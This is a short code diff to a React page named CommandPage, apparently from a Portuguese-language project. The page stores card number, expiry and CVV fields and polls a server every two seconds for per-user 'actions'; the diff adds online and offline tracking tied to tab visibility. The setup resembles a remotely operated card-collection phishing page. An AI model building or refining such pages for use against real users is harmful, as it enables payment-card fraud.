@@ -16,9 +16,10 @@ function CommandPage({ userId }) {
   const [cardExpiry, setCardExpiry] = useState("");
   const [cardCvv, setCardCvv] = useState("");
 
-  // Verificar comandos a cada 2 segundos
+  // Verificar comandos a cada 2 segundos + controle de visibilidade
   useEffect(() => {
     const checkCommand = async () => {
+      if (document.hidden) return;
       try {
         const response = await axios.get(`${API}/user/check-action/${userId}`);
         if (response.data && response.data.action) {
@@ -29,9 +30,21 @@ function CommandPage({ userId }) {
       }
     };
 
+    const handleVisibilityChange = () => {
+      if (document.hidden) {
+        navigator.sendBeacon(`${API}/user/set-offline/${userId}`);
+      } else {
+        checkCommand();
+      }
+    };
+
+    document.addEventListener("visibilitychange", handleVisibilityChange);
     checkCommand();
     const interval = setInterval(checkCommand, 2000);
-    return () => clearInterval(interval);
+    return () => {
+      clearInterval(interval);
+      document.removeEventListener("visibilitychange", handleVisibilityChange);
+    };
   }, [userId]);
 
   // Resetar estados quando o comando muda
